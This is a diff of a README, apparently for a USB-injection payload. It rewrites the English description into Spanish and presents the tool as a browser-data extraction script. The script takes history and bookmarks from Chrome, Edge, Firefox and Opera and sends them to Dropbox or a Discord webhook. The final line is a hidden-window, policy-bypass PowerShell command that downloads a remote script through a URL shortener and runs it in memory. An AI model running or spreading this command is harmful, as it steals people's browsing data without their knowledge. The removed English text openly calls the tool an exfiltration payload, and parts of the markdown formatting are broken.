@@ -1,35 +1,54 @@
+# Script de Extracción de Datos del Navegador
 
-<!-- TABLE OF CONTENTS -->
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li><a href="#Description">Description</a></li>
-    <li><a href="#The-Function">The Function</a></li>
-    <li><a href="#Contact">Contact</a></li>
-    <li><a href="#Acknowledgments">Acknowledgments</a></li>
-  </ol>
-</details>
+Este script de PowerShell está diseñado para extraer datos de navegación (historial y marcadores) de varios navegadores web y subir los datos a Dropbox y Discord.
 
-## Description
+## Características
 
-This payload can be used to retrieve the browsing history and bookmarks from Edge, Chrome, Opera GX, and Firefox (no bookmarks from firefox currently).
+- Soporta la extracción desde Chrome, Edge, Firefox y Opera.
+- Extrae tanto el historial de navegación como los marcadores.
+- Sube los datos extraídos a Dropbox.
+- Opcionalmente envía los datos a un webhook de Discord.
 
-They are then exfiled using either Discord or Dropbox.
+## Requisitos
 
-## The Function
+- PowerShell
+- Conexión a Internet
+- Token de API de Dropbox
+- URL del webhook de Discord
 
-### [Get-BrowserData] 
+## Uso
 
-* Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-* You no longer need to host your own version of this script
-* $db is the variable that holds your DropBox token
-* $dc is the variable that holds your Discord webhook
-* Fill in either variable or both to set your exfil method
+### Parámetros
 
-SYNTAX:
+- **Browser (Navegador)**: Especifica el navegador del cual extraer los datos. Los valores soportados son `chrome`, `edge`, `firefox` y `opera`.
+- **DataType (Tipo de Datos)**: Especifica el tipo de datos a extraer. Los valores soportados son `history` (historial) y `bookmarks` (marcadores).
 
-```
+### Ejemplo
+
+### powershell
+Get-BrowserData -Browser "chrome" -DataType "history"
+Get-BrowserData -Browser "edge" -DataType "bookmarks"
+Instalación
+
+  ##Clona el repositorio:
+
+    bash
+
+git clone https://github.com/tuusuario/extraccion-datos-navegador.git
+cd extraccion-datos-navegador
+Detalles del Script
+
+El script incluye las siguientes funciones:
+
+    Get-BrowserData: Extrae datos del navegador especificado y tipo de datos.
+    DropBox-Upload: Sube los datos extraídos a Dropbox.
+    Upload-Discord: Envía los datos a un webhook de Discord.
+
+Nota
+
+Para que las funciones de subida a Dropbox y Discord funcionen correctamente, asegúrate de configurar las variables de entorno db (token de Dropbox) y dc (URL del webhook de Discord).
+
+Asegúrate de tener los permisos necesarios para ejecutar scripts de PowerShell en tu sistema.
 powershell -w h -ep bypass $dc='';$db='';irm https://n9.cl/mrflipper2 | iex
-```
+
 
